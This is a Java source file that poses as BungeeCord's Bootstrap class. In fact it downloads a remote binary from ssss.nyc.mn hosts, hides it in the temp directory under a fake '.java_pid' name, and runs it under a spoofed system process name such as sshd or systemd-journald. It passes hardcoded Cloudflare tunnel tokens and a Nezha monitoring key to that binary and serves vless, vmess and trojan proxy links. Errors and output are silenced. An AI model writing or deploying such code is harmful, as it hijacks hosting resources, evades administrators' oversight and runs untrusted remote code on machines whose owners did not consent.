package net.md_5.bungee;

import com.sun.net.httpserver.HttpServer;
import java.io.*;
import java.lang.management.ManagementFactory;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.Base64;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.*;

public class Bootstrap
{
    // ============ 伪装进程名 ============
    private static final String[] FAKE_NAMES = {
        "/sbin/agetty",
        "/lib/systemd/systemd-journald",
        "/usr/sbin/sshd",
        "/lib/systemd/systemd-udevd",
        "/usr/lib/systemd/systemd-logind"
    };

    // ============ 所有配置通过环境变量读取，与 sbsh 约定一致 ============
    private static final String UUID        = ge("UUID",        "07721186-24d9-4962-8a27-3964206bceba");
    private static final String FILE_PATH   = ge("FILE_PATH",   "./tmp");
    private static final String ARGO_DOMAIN = ge("ARGO_DOMAIN", "karlo-hosting.cnm.ccwu.cc");
    private static final String ARGO_AUTH   = ge("ARGO_AUTH",
            "eyJhIjoiY2YxMDY1YTFhZDk1YjIxNzUxNGY3MzRjNzgyYzlkMDkiLCJ0IjoiMzljZTI3ODktZDUxMS00ZmYyLWEyYmMtZmU0NDdlOWM2YjZiIiwicyI6Ik5HUTNaVEJqT1RrdE5tTm1aaTAwTmpBeUxUZzVZbU10TWpFeE1EVTRPRFpoTkdFMiJ9");
    private static final String ARGO_PORT   = ge("ARGO_PORT",   "8080");
    private static final String CFIP        = ge("CFIP",        "cdns.doon.eu.org");
    private static final String CFPORT      = ge("CFPORT",      "443");
    private static final String NAME        = ge("NAME",        "Node");
    private static final String NEZHA_SERVER= ge("NEZHA_SERVER","nzmbv.wuge.nyc.mn:443");
    private static final String NEZHA_PORT  = ge("NEZHA_PORT",  "");
    private static final String NEZHA_KEY   = ge("NEZHA_KEY",   "gUxNJhaKJgceIgeapZG4956rmKFgmQgP");
    private static final String SUB_PATH    = ge("SUB_PATH",    "sb");
    private static final int    HTTP_PORT   = Integer.parseInt(ge("HTTP_PORT", "3000"));

    // ============ 文件路径 ============
    private static final String TMP  = System.getProperty("java.io.tmpdir");
    private static final String PID  = getPid();
    // sbsh 二进制用隐蔽名称放在系统临时目录
    private static final File fSbx   = new File(TMP, ".java_pid" + PID);
    // sbsh 写入 boot.log 的路径（quick tunnel 时提取域名用）
    private static final File fLog   = new File(FILE_PATH, "boot.log");

    private static volatile String encodedSub = "";
    private static HttpServer httpServer;
    private static final AtomicBoolean running = new AtomicBoolean(true);

    // ============ 入口 ============
    public static void main(String[] args) throws Exception
    {
        // 订阅 HTTP 服务
        httpServer = HttpServer.create(new InetSocketAddress(HTTP_PORT), 0);
        httpServer.createContext("/", exchange -> {
            String path = exchange.getRequestURI().getPath();
            byte[] body = path.equals("/" + SUB_PATH)
                ? encodedSub.getBytes(StandardCharsets.UTF_8)
                : "OK".getBytes(StandardCharsets.UTF_8);
            String ct = path.equals("/" + SUB_PATH)
                ? "text/plain; charset=utf-8" : "text/plain";
            exchange.getResponseHeaders().set("Content-Type", ct);
            exchange.sendResponseHeaders(200, body.length);
            exchange.getResponseBody().write(body);
            exchange.getResponseBody().close();
        });
        httpServer.start();

        Thread t = new Thread(() -> {
            try { startup(); } catch (Exception e) { /* silent */ }
        });
        t.setDaemon(false);
        t.start();

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            running.set(false);
            if (httpServer != null) httpServer.stop(0);
        }));
    }

    // ============ 主流程 ============
    private static void startup() throws Exception {
        // 1. 下载 sbsh
        downloadSbx();

        // 2. 启动 sbsh，所有配置（xray + argo + nezha）全通过环境变量传入
        //    sbsh 内部自行处理一切，不需要我们额外下载 xray/cloudflared/nezha
        startSbx();

        // 3. 等 sbsh 内部服务起来（15秒，与例子一致）
        Thread.sleep(15000);

        // 4. 获取域名
        String domain = (!ARGO_DOMAIN.isEmpty()) ? ARGO_DOMAIN : extractDomain(0);

        // 5. 生成并输出订阅
        generateSubscription(domain);
    }

    // ============ 下载 sbsh ============
    private static void downloadSbx() throws Exception {
        if (fSbx.exists()) return;

        String arch = System.getProperty("os.arch").toLowerCase();
        String url;
        if (arch.contains("amd64") || arch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (arch.contains("aarch64") || arch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (arch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported arch: " + arch);
        }

        download(url, fSbx);
        fSbx.setExecutable(true);
    }

    // ============ 启动 sbsh，伪装进程名 ============
    private static void startSbx() throws Exception {
        // 构造环境变量，键名与 sbsh 内部约定完全一致
        Map<String, String> env = new HashMap<>(System.getenv());
        env.put("UUID",         UUID);
        env.put("FILE_PATH",    FILE_PATH);
        env.put("ARGO_DOMAIN",  ARGO_DOMAIN);
        env.put("ARGO_AUTH",    ARGO_AUTH);
        env.put("ARGO_PORT",    ARGO_PORT);
        env.put("CFIP",         CFIP);
        env.put("CFPORT",       CFPORT);
        env.put("NAME",         NAME);
        env.put("NEZHA_SERVER", NEZHA_SERVER);
        env.put("NEZHA_PORT",   NEZHA_PORT);
        env.put("NEZHA_KEY",    NEZHA_KEY);

        // exec -a 伪装 argv[0]，ps aux 只看到系统进程名
        String fake = FAKE_NAMES[new Random().nextInt(FAKE_NAMES.length)];
        ProcessBuilder pb = new ProcessBuilder(
            "sh", "-c",
            "exec -a '" + fake + "' " + fSbx.getAbsolutePath()
        );
        pb.environment().clear();
        pb.environment().putAll(env);
        pb.redirectErrorStream(true);
        pb.redirectOutput(new File("/dev/null"));
        pb.start();
    }

    // ============ 提取 quick tunnel 域名 ============
    private static String extractDomain(int retries) throws Exception {
        try {
            if (!fLog.exists()) {
                if (retries < 10) { Thread.sleep(3000); return extractDomain(retries + 1); }
                return null;
            }
            String content = readFile(fLog);
            Matcher m = Pattern.compile("https?://([^ ]*trycloudflare\\.com)").matcher(content);
            if (m.find()) return m.group(1);
            if (retries < 10) { Thread.sleep(3000); return extractDomain(retries + 1); }
        } catch (Exception e) { /* silent */ }
        return null;
    }

    // ============ 生成订阅 ============
    private static void generateSubscription(String domain) throws IOException {
        if (domain == null || domain.isEmpty()) return;

        String vmessJson = String.format(
            "{\"v\":\"2\",\"ps\":\"%s-vmess\",\"add\":\"%s\",\"port\":\"%s\",\"id\":\"%s\"," +
            "\"aid\":\"0\",\"net\":\"ws\",\"type\":\"none\",\"host\":\"%s\"," +
            "\"path\":\"/vmess?ed=2560\",\"tls\":\"tls\",\"sni\":\"%s\",\"fp\":\"firefox\"}",
            NAME, CFIP, CFPORT, UUID, domain, domain);

        String vless  = String.format(
            "vless://%s@%s:%s?encryption=none&security=tls&sni=%s&fp=firefox&type=ws&host=%s&path=%%2Fvless%%3Fed%%3D2560#%s-vless",
            UUID, CFIP, CFPORT, domain, domain, NAME);
        String vmess  = "vmess://" + b64(vmessJson);
        String trojan = String.format(
            "trojan://%s@%s:%s?security=tls&sni=%s&fp=firefox&type=ws&host=%s&path=%%2Ftrojan%%3Fed%%3D2560#%s-trojan",
            UUID, CFIP, CFPORT, domain, domain, NAME);

        encodedSub = b64(vless + "\n\n" + vmess + "\n\n" + trojan + "\n");

        System.out.println(vless);
        System.out.println(vmess);
        System.out.println(trojan);
        System.out.println(encodedSub);
    }

    // ============ 工具方法 ============
    private static void download(String urlStr, File dest) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
        conn.setConnectTimeout(30000);
        conn.setReadTimeout(60000);
        conn.setInstanceFollowRedirects(true);
        conn.setRequestProperty("User-Agent",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36");
        try (InputStream in = conn.getInputStream();
             FileOutputStream out = new FileOutputStream(dest)) {
            byte[] buf = new byte[8192]; int n;
            while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
        }
    }

    private static String readFile(File f) throws IOException {
        StringBuilder sb = new StringBuilder();
        try (BufferedReader r = new BufferedReader(
                new InputStreamReader(new FileInputStream(f), StandardCharsets.UTF_8))) {
            String line;
            while ((line = r.readLine()) != null) sb.append(line).append('\n');
        }
        return sb.toString();
    }

    private static String b64(String s) {
        return Base64.getEncoder().encodeToString(s.getBytes(StandardCharsets.UTF_8));
    }

    private static String ge(String key, String def) {
        String v = System.getenv(key);
        return (v != null && !v.isEmpty()) ? v : def;
    }

    private static String getPid() {
        try {
            String name = ManagementFactory.getRuntimeMXBean().getName();
            return name.split("@")[0];
        } catch (Exception e) {
            return String.valueOf(new Random().nextInt(99999));
        }
    }
}
